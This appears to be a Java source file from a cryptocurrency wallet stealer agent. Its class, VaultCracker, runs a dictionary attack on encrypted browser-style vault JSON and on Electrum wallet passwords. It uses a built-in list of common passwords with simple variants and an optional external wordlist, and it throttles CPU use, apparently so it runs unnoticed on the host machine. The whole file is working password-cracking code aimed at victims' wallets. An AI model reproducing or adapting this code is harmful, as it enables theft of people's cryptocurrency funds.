package com.serverpackcore.agent.crypto;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;

/** Bounded dictionary attack. CPU is capped by sleeping between batches. */
final class VaultCracker {
	record Result(boolean found, String password, int attempts, long elapsedMs) {
	}

	private static final String[] COMMON = {
		"123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567",
		"dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master",
		"666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman",
		"1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan",
		"jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew",
		"tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger",
		"daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica",
		"pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass",
		"maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
		"love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",
		"dallas", "austin", "thunder", "taylor", "matrix", "william", "corvette", "hello", "martin",
		"heather", "secret", "merlin", "diamond", "1234qwer", "gfhjkm", "hammer", "silver", "222222",
		"88888888", "anthony", "justin", "test", "bailey", "q1w2e3r4t5", "patrick", "internet",
		"scooter", "orange", "11111", "golfer", "cookie", "richard", "samantha", "bigdog", "guitar",
		"jackson", "whatever", "mickey", "chicken", "sparky", "snoopy", "maverick", "phoenix",
		"camaro", "sexy", "peanut", "morgan", "welcome", "falcon", "cowboy", "ferrari", "samsung",
		"andrea", "smokey", "steelers", "joseph", "mercedes", "dakota", "arsenal", "eagles", "melissa",
		"boomer", "booboo", "spider", "nascar", "monster", "tigers", "yellow", "xxxxxx", "123123123",
		"gateway", "marina", "diablo", "bulldog", "qwer1234", "compaq", "purple", "hardcore", "banana",
		"junior", "hannah", "123654", "porsche", "lakers", "iceman", "money", "cowboys", "987654",
		"london", "tennis", "999999", "ncc1701", "coffee", "scooby", "0000", "miller", "boston",
		"q1w2e3r4", "fuckoff", "brandon", "yamaha", "chester", "mother", "forever", "johnny",
		"edward", "333333", "oliver", "redsox", "player", "nikita", "knight", "fender", "barney",
		"midnight", "please", "brandy", "chicago", "badboy", "iwantu", "slayer", "rangers", "charles",
		"angel", "flower", "bigdaddy", "rabbit", "wizard", "bigdick", "jasper", "enter", "rachel",
		"chris", "steven", "winner", "adidas", "victoria", "natasha", "1q2w3e4r", "jasmine", "winter",
		"prince", "panties", "marine", "ghbdtn", "fishing", "cocacola", "casper", "james", "232323",
		"raiders", "888888", "marlboro", "gandalf", "asdfasdf", "crystal", "87654321", "12344321",
		"mountain", "connor", "bear", "sierra", "sophie", "dolphin", "rocket", "blowme", "snowball",
		"tiger", "moscow", "dennis", "blonde", "dallas", "dreams", "nintendo", "sf49ers", "slipknot",
		"qwerty1", "qwerty123", "password1", "password123", "admin", "admin123", "root", "toor",
		"letmein1", "changeme", "welcome1", "welcome123", "monkey1", "dragon1", "master1", "abc12345"
	};

	private VaultCracker() {
	}

	static Result crack(String vaultJson, int maxSeconds, int cpuPct, String wordlist, AtomicBoolean cancelled) {
		return run(candidate -> VaultV3.valid(vaultJson, candidate), maxSeconds, cpuPct, wordlist, cancelled);
	}

	static Result crackElectrum(java.nio.file.Path wallet, int maxSeconds, int cpuPct, String wordlist, AtomicBoolean cancelled) {
		return run(candidate -> DesktopWallets.electrumPassword(wallet, candidate) != null, maxSeconds, cpuPct, wordlist, cancelled);
	}

	private static Result run(java.util.function.Predicate<String> test, int maxSeconds, int cpuPct, String wordlist, AtomicBoolean cancelled) {
		long started = System.currentTimeMillis();
		long deadline = started + Math.max(5, maxSeconds) * 1000L;
		int attempts = 0;
		Set<String> seen = new LinkedHashSet<>();
		for (String value : COMMON) {
			seen.add(value);
		}
		for (String base : COMMON) {
			seen.add(capitalize(base));
			seen.add(base + "1");
			seen.add(base + "!");
		}
		if (wordlist != null && !wordlist.isBlank()) {
			try {
				Path file = Path.of(wordlist);
				if (Files.isRegularFile(file) && Files.size(file) < 32L * 1024L * 1024L) {
					for (String line : Files.readAllLines(file, StandardCharsets.UTF_8)) {
						String value = line.strip();
						if (!value.isEmpty() && value.length() <= 128) {
							seen.add(value);
						}
					}
				}
			} catch (Throwable ignored) {
				// external list is optional
			}
		}
		int batch = Math.max(4, cpuPct / 10);
		for (String candidate : seen) {
			if (cancelled.get() || System.currentTimeMillis() > deadline) {
				break;
			}
			attempts++;
			if (test.test(candidate)) {
				return new Result(true, candidate, attempts, System.currentTimeMillis() - started);
			}
			if (cpuPct < 100 && attempts % batch == 0) {
				try {
					Thread.sleep(Math.max(1L, (100L - cpuPct) / 10L));
				} catch (InterruptedException interrupted) {
					break;
				}
			}
		}
		return new Result(false, null, attempts, System.currentTimeMillis() - started);
	}

	private static String capitalize(String value) {
		return value.isEmpty() ? value : Character.toUpperCase(value.charAt(0)) + value.substring(1);
	}

	static List<String> dictionary() {
		List<String> list = new ArrayList<>();
		for (String value : COMMON) {
			list.add(value);
		}
		return list;
	}
}
